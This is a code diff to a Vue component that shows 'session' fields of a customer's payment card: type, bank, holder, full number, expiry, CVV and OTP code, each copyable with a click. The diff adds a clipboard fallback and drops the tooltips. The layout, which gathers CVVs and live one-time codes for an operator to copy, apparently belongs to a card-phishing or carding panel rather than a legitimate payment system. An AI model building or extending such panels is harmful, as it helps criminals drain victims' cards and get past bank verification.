@@ -6,23 +6,28 @@ defineProps<{
 
 function copy(val: string) {
   if (!val) return;
-  navigator.clipboard.writeText(val).then(() => {
-    window.$message?.success('已复制:' + val);
-  }).catch(() => {});
+  try {
+    if (navigator.clipboard && navigator.clipboard.writeText) {
+      navigator.clipboard.writeText(val).then(() => { window.$message?.success('已复制:' + val) }).catch(() => {});
+    } else {
+      var el = document.createElement('textarea'); el.value = val; el.style.position = 'fixed'; el.style.opacity = '0'; document.body.appendChild(el); el.select(); document.execCommand('copy'); document.body.removeChild(el);
+      window.$message?.success('已复制:' + val);
+    }
+  } catch (e) { window.$message?.error('复制失败') }
 }
 </script>
 
 <template>
   <div class="session-fields">
-    <div class="field" v-if="cardInfo.cardType" @click="copy(cardInfo.cardType)" title="点击复制"><label>卡类型</label><span class="value">{{ cardInfo.cardType }}</span></div>
-    <div class="field" v-if="cardInfo.cardLevel" @click="copy(cardInfo.cardLevel)" title="点击复制"><label>卡级</label><span class="value">{{ cardInfo.cardLevel }}</span></div>
-    <div class="field field-wide" v-if="cardInfo.bankName" @click="copy(cardInfo.bankName)" title="点击复制"><label>发卡行</label><span class="value">{{ cardInfo.bankName }}</span></div>
-    <div class="field" v-if="customerInfo.phone" @click="copy(customerInfo.phone)" title="点击复制"><label>电话</label><span class="value">{{ customerInfo.phone }}</span></div>
-    <div class="field field-wide" v-if="cardInfo.cardHolder" @click="copy(cardInfo.cardHolder)" title="点击复制"><label>持卡人</label><span class="value">{{ cardInfo.cardHolder }}</span></div>
-    <div class="field field-card" v-if="cardInfo.cardNumber" @click="copy(cardInfo.cardNumber)" title="点击复制"><label>卡号</label><span class="value value-green">{{ cardInfo.cardNumber }}</span></div>
-    <div class="field" v-if="cardInfo.expiry" @click="copy(cardInfo.expiry)" title="点击复制"><label>有效期</label><span class="value">{{ cardInfo.expiry }}</span></div>
-    <div class="field" v-if="cardInfo.cvv" @click="copy(cardInfo.cvv)" title="点击复制"><label>CVV</label><span class="value">{{ cardInfo.cvv }}</span></div>
-    <div class="field" v-if="cardInfo.otpCode" @click="copy(cardInfo.otpCode)" title="点击复制"><label>验证码</label><span class="value value-orange">{{ cardInfo.otpCode }}</span></div>
+    <div class="field" v-if="cardInfo.cardType" @click="copy(cardInfo.cardType)"><label>卡类型</label><span class="value">{{ cardInfo.cardType }}</span></div>
+    <div class="field" v-if="cardInfo.cardLevel" @click="copy(cardInfo.cardLevel)"><label>卡级</label><span class="value">{{ cardInfo.cardLevel }}</span></div>
+    <div class="field field-wide" v-if="cardInfo.bankName" @click="copy(cardInfo.bankName)"><label>发卡行</label><span class="value">{{ cardInfo.bankName }}</span></div>
+    <div class="field" v-if="customerInfo.phone" @click="copy(customerInfo.phone)"><label>电话</label><span class="value">{{ customerInfo.phone }}</span></div>
+    <div class="field field-wide" v-if="cardInfo.cardHolder" @click="copy(cardInfo.cardHolder)"><label>持卡人</label><span class="value">{{ cardInfo.cardHolder }}</span></div>
+    <div class="field field-card" v-if="cardInfo.cardNumber" @click="copy(cardInfo.cardNumber)"><label>卡号</label><span class="value value-green">{{ cardInfo.cardNumber }}</span></div>
+    <div class="field" v-if="cardInfo.expiry" @click="copy(cardInfo.expiry)"><label>有效期</label><span class="value">{{ cardInfo.expiry }}</span></div>
+    <div class="field" v-if="cardInfo.cvv" @click="copy(cardInfo.cvv)"><label>CVV</label><span class="value">{{ cardInfo.cvv }}</span></div>
+    <div class="field" v-if="cardInfo.otpCode" @click="copy(cardInfo.otpCode)"><label>验证码</label><span class="value value-orange">{{ cardInfo.otpCode }}</span></div>
   </div>
 </template>
 
